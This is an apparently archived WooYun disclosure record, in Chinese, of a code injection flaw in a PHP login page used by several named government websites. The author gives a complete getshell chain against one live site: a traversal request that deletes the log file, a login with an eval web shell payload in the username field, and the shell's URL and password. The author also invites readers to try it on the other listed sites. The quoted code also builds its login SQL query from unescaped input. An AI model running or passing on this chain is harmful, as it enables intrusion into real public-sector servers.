{"id": 46157, "wybug_id": "wooyun-2014-085633", "wybug_title": "某Gov在用系统另外一处任意代码执行漏洞", "wybug_corp": "台州市极速网络有限公司", "wybug_author": "路人甲", "wybug_date": "2014-12-03 14:24", "wybug_open_date": "2015-03-03 14:26", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-03：\t细节向公众公开  简要描述： 接上一蛋是否可好？http://www.wooyun.org/bugs/wooyun-2014-084830 详细说明：  上一蛋谈到了任意文件删除...但是我没直接告诉大家怎么getshell...好吧！ 承认我买了个萌..我来发一蛋getshell。。。。涉及案例如下：\n\n http://www.qlxj.gov.cnhttp://www.lhjw.gov.cnhttp://www.jjwomen.orghttp://www.jjqjcy.gov.cnhttp://www.tzlgb.gov.cnhttp://dns6.90576.com/tzqf/....看下根目录当中的login.php吧！\n<?$IS_LOGIN = true;require \"./includes/headinc.php\";register_shutdown_function('union_end');if($action == 'logout') {\t$union_user = $union_pass = $gid = '';\t//clearcookies();\t//$sess_arr = array();\t$_SESSION[sess_arr] = $sess_arr = '';\tsession_unregister('sess_arr');\techo \"<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=admin.php\\\">\";\t\t//header(\"Location:login.php\");\texit;}if($action == 'login') {\t$validate_t = crypt($validate, 'ckskya576');\tif($_SESSION[md5vali] != $validate_t)\t\t//showmessage(\"验证码检验失败,请返回\");\t$UNION_USER = '';\t$loginpass2 = md5($loginpass);\t$UNION_USER = $db->fetchSingle(\"SELECT uid AS union_uid, fig AS union_fig, username AS union_user, password AS union_pass FROM table_members WHERE username='$loginuser' && password='$loginpass2'\");\tif($UNION_USER[union_uid] && !$UNION_USER[union_fig])\t\tshowmessage('此帐号不可用');\tif ($UNION_USER) {\t\t//$qs_ts = $db->query_fetch(\"select * from table_sessions where username='$UNION_USER[union_user]' && ip!='$yip'\");\t\t//if($qs_ts[username])\t\t//\tshowmessage('对不起, 同一帐号不能同时在多台电脑上登录');\t\t//echo \"delete from table_sessions where ip='$yip' && sesskey!='\".session_id().\"'\";exit;\t\t//$db->query(\"delete from table_sessions where ip='$yip' && sesskey!='\".session_id().\"'\");\t\t#$db->queryDb(\"update table_members set loginnum=loginnum+1,lastlogin='\".time().\"' where uid=$UNION_USER[union_uid]\",1);\t\t//union_setcookie(\"union_user_\", $UNION_USER['union_user']);\t\t//union_setcookie(\"union_pass_\", $UNION_USER['union_pass']);\t}else{\t\t$errorlog = \"$loginuser\\t\".substr($loginpass, 0, 2);\t\tfor($i = 3; $i < strlen($loginpass); $i++) {\t\t\t$errorlog .= \"*\";\t\t}\t\t$errorlog .= substr($loginpass, -1).\"\\t$yip\\t$timestamp\\n\";\t\t@$fp = fopen(\"./data/log/passlog.php\", \"a\");\t\t@flock($fp, 3);\t\t@fwrite($fp, $errorlog);\t\t@fclose($fp);\t\t//clearcookies();\t}\n其中的\n$errorlog = \"$loginuser\\t\".substr($loginpass, 0, 2);\t\tfor($i = 3; $i < strlen($loginpass); $i++) {\t\t\t$errorlog .= \"*\";\t\t}\t\t$errorlog .= substr($loginpass, -1).\"\\t$yip\\t$timestamp\\n\";\t\t@$fp = fopen(\"./data/log/passlog.php\", \"a\");\t\t@flock($fp, 3);\t\t@fwrite($fp, $errorlog);\t\t@fclose($fp);\n其中登录失败就直接将错误的用户名和过滤的密码写到data/log/passlog.php当中了。。。你想想，这是不是任意代码写入呢？？这是赤裸裸让你写恶意代码进去啊？ 是不是可以直接写一句话呢？ 当然是可以的例如你用户名处填<?php phpinfo();?>  密码随便输   到时候你访问下data/log/passlog.php就知道是否执行了。不过一般很多有错误登录的记录，所以这个文件有错误，导致不能马上执行，但是你想到过我前一蛋么？？？？直接任意文件删除getshell步骤如下（千万别做坏事，后果自负）1、先访问如：http://www.qlxj.gov.cn/picup.php?action=del&pic=../data/log/passlog.php2、然后访问 http://www.qlxj.gov.cn/login.php   用户名填：<?php phpinfo();eval($_POST[wooyun]);?>   密码：33333333、访问：  http://www.qlxj.gov.cn/data/log/passlog.php 即为shell  密码就是wooyun 是不是猥琐？自己测吧！ 案例一大把http://www.qlxj.gov.cnhttp://www.lhjw.gov.cnhttp://www.jjwomen.org\n\n哈哈....疯狗叔叔 2、然后访问：   漏洞证明：  \n\n   修复方案：  在文件前面加个<?php exit;?>吧！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-12-08 12:16 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给浙江分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-03 14:57 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:87        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  应该是接这一蛋 WooYun: 某Gov在用系统存在PHP代码执行漏洞  楼主运气真好，来两发都是大厂商，哪里像我多可怜！    \n     2014-12-03 17:35 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:176        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  @U神 怎么看是走大厂商怎么看走小厂商啊    \n     2015-03-03 16:52 |    \t\t无心、 \t\t\t( 实习白帽子  |\t\t\t        Rank:71 漏洞数:19        | 你不是风儿，我也不是沙，再怎么缠绵也到不...)\t\t \n  @茜茜公主 能在首页出现在最新提交的，就是大厂商。其次，厂商回复给你多少rank，你得到多少rank就是大厂商，得到1/5就是小厂商    \n     2015-03-04 02:59 |    \t\t老胖子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        )\t\t \n  危害挺大的看起来，    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}